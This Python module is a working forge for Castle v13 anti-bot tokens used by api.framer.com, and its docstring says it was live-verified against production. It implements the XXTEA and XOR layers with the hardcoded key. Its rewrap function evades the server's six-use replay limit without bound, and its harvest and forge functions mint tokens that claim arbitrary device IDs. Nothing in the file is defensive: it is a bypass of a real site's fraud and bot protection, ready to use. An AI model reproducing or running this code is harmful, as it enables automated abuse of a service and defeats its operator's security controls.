"""Offline Castle v13 token forge for framerize.

Live-verified 2026-10-05 against api.framer.com:
- RE-WRAP: the 6-use coupon tracker keys on the token STRING. Re-keying the
  outer XOR (new first byte) yields a new string with byte-identical decrypted
  content and a fresh coupon. Unlimited.
- SPLICE: the device id (CUID) lives only in the 56-byte header (6B init_time +
  2B fp-version + 32B publishable key + 16B CUID) and is NOT embedded in the
  encrypted body. Swapping the header CUID and re-encrypting the inner layers
  with the new CUID yields a valid token for an arbitrary claimed device.
- Content IS validated: any byte corruption of the fingerprint body = 403;
  byte-exact re-encode = 200. Our pipeline round-trips byte-exact (control).
- build_header's timestamp encoding is NOT reliable (the SDK's nibble key
  varies per token; the public encoder hardcodes 0xA). We therefore splice the
  original header bytes verbatim and never re-encode timestamps.

Crypto lineage: XXTEA with Castle's custom delta + the v2.8.4 outer key
(unchanged through v13, verified on live tokens), inner deriveKeyAndXor layers
— as reversed by yubie-re/castleio-gen (v11) and gelistiricitr/castle-reverse
(v13 structure), completed and verified here against production.
"""

import base64
import math
import random

# ── base64url ────────────────────────────────────────────────────────────────

def _b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")


# ── XXTEA with Castle's custom delta ─────────────────────────────────────────

_DELTA_PARTS = [2650800128, 3633152, 2489]
_DELTA = ((_DELTA_PARTS[0] + _DELTA_PARTS[1] + _DELTA_PARTS[2]) & 0xFFFFFFFF)

# Global outer XXTEA keys (first matches live Framer v13 tokens).
GLOBAL_KEY = [1164413191, 3891440048, 218959117, 2746598870]


def _blocks(data: bytes) -> list:
    n = math.ceil(len(data) / 4)
    padded = data + b"\x00" * (n * 4 - len(data))
    return [int.from_bytes(padded[i:i + 4], "little") for i in range(0, n * 4, 4)]


def _unblocks(blocks: list) -> bytes:
    return b"".join(b.to_bytes(4, "little") for b in blocks)


def xxtea_encrypt(data: bytes, key: list) -> bytes:
    r = _blocks(data)
    u = len(r) - 1
    if u < 1:
        return data
    i = 0
    o = r[u]
    a = r[0]
    f = 6 + 52 // (u + 1)
    while f > 0:
        f -= 1
        i = (i + _DELTA) & 0xFFFFFFFF
        e = (i >> 2) & 3
        for c in range(u):
            a = r[c + 1]
            r[c] = (r[c] + ((((o >> 5) ^ (a << 2)) + ((a >> 3) ^ (o << 4))) ^ ((i ^ a) + (key[(c & 3) ^ e] ^ o)))) & 0xFFFFFFFF
            o = r[c]
        a = r[0]
        r[u] = (r[u] + ((((o >> 5) ^ (a << 2)) + ((a >> 3) ^ (o << 4))) ^ ((i ^ a) + (key[(u & 3) ^ e] ^ o)))) & 0xFFFFFFFF
        o = r[u]
    return _unblocks(r)


def xxtea_decrypt(data: bytes, key: list) -> bytes:
    if len(data) < 8:
        return data
    r = _blocks(data)
    u = len(r) - 1
    if u < 1:
        return data
    q = 6 + 52 // (u + 1)
    i = (q * _DELTA) & 0xFFFFFFFF
    y = r[0]
    while i != 0:
        e = (i >> 2) & 3
        for p in range(u, 0, -1):
            z = r[p - 1]
            r[p] = (r[p] - ((((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((i ^ y) + (key[(p & 3) ^ e] ^ z)))) & 0xFFFFFFFF
            y = r[p]
        z = r[u]
        r[0] = (r[0] - ((((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((i ^ y) + (key[0 ^ e] ^ z)))) & 0xFFFFFFFF
        y = r[0]
        i = (i - _DELTA) & 0xFFFFFFFF
    return _unblocks(r)


# ── inner derive-key-and-xor layer ───────────────────────────────────────────

def _derive_xor(key_hex: str, slice_len: int, rotation_key_nibble: str, data: bytes) -> bytes:
    key_slice = key_hex[:slice_len]
    if not key_slice:
        return data
    rotation_idx = int(rotation_key_nibble, 16) % len(key_slice)
    rotated = key_slice[rotation_idx:] + key_slice[:rotation_idx]
    key_bytes = bytes.fromhex(rotated)
    klen = len(key_bytes)
    return bytes([b ^ key_bytes[i % klen] for i, b in enumerate(data)])


# ── public API ───────────────────────────────────────────────────────────────

def rewrap(token: str) -> str:
    """Outer-XOR re-key: new token STRING, byte-identical decrypted content.
    The server's 6-use coupon tracker keys on the string → fresh coupon."""
    raw = _b64d(token)
    k1 = raw[0]
    body = bytes(b ^ k1 for b in raw[1:])
    k2 = random.randint(1, 255)
    while k2 == k1:
        k2 = random.randint(1, 255)
    return _b64e(bytes([k2]) + bytes(b ^ k2 for b in body))


def harvest(token: str) -> dict:
    """Decode one real minted token into the parts needed to forge:
    the 56-byte header (verbatim), the raw fingerprint body, the send-time
    layer key, and the claimed CUID. Everything else stays constant per
    fingerprint generation."""
    raw = _b64d(token.strip())
    xor_key = raw[0]
    xored = bytes(b ^ xor_key for b in raw[1:-1])
    version_marker = xored[0]
    padding_byte = xored[1]
    blob = xxtea_decrypt(xored[2:], GLOBAL_KEY)
    header = blob[:56]                      # 6 ts + 2 fv + 32 pk + 16 cuid
    cuid = header[40:56].hex()
    inner = blob[56:]
    layer2 = _derive_xor(cuid, 8, cuid[9], inner)
    send_time_key = layer2[:6]
    layer1 = layer2[6:]
    raw_fp = _derive_xor(send_time_key.hex(), 4, send_time_key.hex()[3], layer1)
    return {
        "header_hex": header.hex(),
        "raw_fp_hex": raw_fp.hex(),
        "send_time_key_hex": send_time_key.hex(),
        "cuid": cuid,
        "version_marker": version_marker,
        "padding_byte": padding_byte,
    }


def forge(h: dict, cuid_hex: str) -> str:
    """Mint a token claiming device `cuid_hex` with the harvested fingerprint.
    Header: original bytes with only the 16 CUID bytes swapped. Inner layers
    re-encrypted under the new CUID (the layer keys derive from it)."""
    header = bytes.fromhex(h["header_hex"])[:40] + bytes.fromhex(cuid_hex)
    fp_key_hex = h["send_time_key_hex"]
    layer1 = _derive_xor(fp_key_hex, 4, fp_key_hex[3], bytes.fromhex(h["raw_fp_hex"]))
    rot = cuid_hex[9]
    inner = _derive_xor(cuid_hex, 8, rot, bytes.fromhex(fp_key_hex) + layer1)
    blob = header + inner
    enc = xxtea_encrypt(blob, GLOBAL_KEY)
    xored_body = bytes([h["version_marker"], h["padding_byte"]]) + enc
    length_tag = (len(xored_body) * 2) & 0xFF
    k = random.randint(1, 255)
    wrapped = bytes([k]) + bytes(b ^ k for b in xored_body) + bytes([length_tag ^ k])
    return _b64e(wrapped)
